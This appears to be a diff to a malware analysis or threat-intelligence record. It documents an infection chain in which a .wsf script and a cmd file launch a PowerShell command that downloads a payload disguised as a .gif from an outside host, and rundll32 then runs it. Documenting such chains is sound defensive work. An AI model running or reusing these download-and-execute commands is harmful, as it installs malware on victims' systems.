@@ -13,7 +13,9 @@ WScript.exe C:\Users\Admin\AppData\Local\Temp\Open.wsf
 
 cmd.exe/c C:\Users\Admin\AppData\Local\Temp\r.cmd
 
-poweRshell -C Start-Sleep 11;rundll32 rei.dat,Wind
+poweRshell  -C iwr 'http://baracundofres.com/images/150223.gif' -OutFile 'rei.dat'
+
+poweRshell -C Start-Sleep 11
 
 rundll32.exe" rei.dat,Wind
 
